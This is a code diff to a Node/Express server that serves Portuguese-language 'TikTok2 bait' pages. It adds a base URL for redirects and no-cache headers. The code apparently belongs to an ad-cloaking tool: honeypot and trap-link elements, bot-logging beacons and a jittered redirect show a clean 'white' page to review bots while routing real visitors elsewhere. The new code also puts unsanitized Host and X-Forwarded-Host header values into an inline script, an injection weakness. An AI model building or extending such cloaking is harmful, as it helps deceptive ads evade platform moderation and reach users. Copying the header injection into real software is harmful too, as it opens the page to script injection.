@@ -105,12 +105,16 @@ function sanitizeUrl(url: string): string {
   }
 }
 
-function generateTikTok2BaitHTML(token: string, whiteUrl: string): string {
+function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: string): string {
   const honeypotId = `hp_${randomBytes(4).toString('hex')}`;
   const trapLinkId = `tl_${randomBytes(4).toString('hex')}`;
   const delay = 350 + Math.floor(Math.random() * 150); // 350-500ms with jitter
   const safeWhiteUrl = sanitizeUrl(whiteUrl);
-  const botLogUrl = `/b/${token}`;
+  
+  // Use absolute URLs to avoid routing issues with custom domains
+  const prefix = baseUrl ? baseUrl : '';
+  const botLogUrl = `${prefix}/b/${token}`;
+  const verifyUrl = `${prefix}/v/${token}`;
   
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -148,7 +152,7 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string): string {
   
   <script>
     (function(){
-      var w='${safeWhiteUrl}',b='/v/${token}',bl='${botLogUrl}',d=${delay};
+      var w='${safeWhiteUrl}',b='${verifyUrl}',bl='${botLogUrl}',d=${delay};
       
       function logBot(r){
         var img=new Image();
@@ -2658,9 +2662,18 @@ export async function registerRoutes(
         
         console.log(`[TikTok2] Serving bait page for ${slug} (${duration}ms) - Token: ${baitToken.substring(0, 16)}...`);
         
-        const baitHTML = generateTikTok2BaitHTML(baitToken, whiteUrl);
+        // Build base URL for verification redirects (important for custom domains)
+        const proto = req.get('x-forwarded-proto') || 'https';
+        const hostHeader = req.get('x-forwarded-host') || req.get('host') || '';
+        const baseUrl = hostHeader ? `${proto}://${hostHeader}` : '';
+        
+        console.log(`[TikTok2] Using baseUrl: ${baseUrl} for verification redirects`);
+        
+        const baitHTML = generateTikTok2BaitHTML(baitToken, whiteUrl, baseUrl);
         res.set('Content-Type', 'text/html');
         res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+        res.set('Pragma', 'no-cache');
+        res.set('Expires', '0');
         return res.send(baitHTML);
       }
 
@@ -3047,9 +3060,18 @@ export async function registerRoutes(
         
         console.log(`[TikTok2] Serving bait page for ${slug} (${duration}ms) - Token: ${baitToken.substring(0, 16)}...`);
         
-        const baitHTML = generateTikTok2BaitHTML(baitToken, whiteUrl);
+        // Build base URL for verification redirects (important for custom domains)
+        const proto = req.get('x-forwarded-proto') || 'https';
+        const hostHeader = req.get('x-forwarded-host') || req.get('host') || '';
+        const baseUrl = hostHeader ? `${proto}://${hostHeader}` : '';
+        
+        console.log(`[TikTok2] Using baseUrl: ${baseUrl} for verification redirects`);
+        
+        const baitHTML = generateTikTok2BaitHTML(baitToken, whiteUrl, baseUrl);
         res.set('Content-Type', 'text/html');
         res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+        res.set('Pragma', 'no-cache');
+        res.set('Expires', '0');
         return res.send(baitHTML);
       }
 
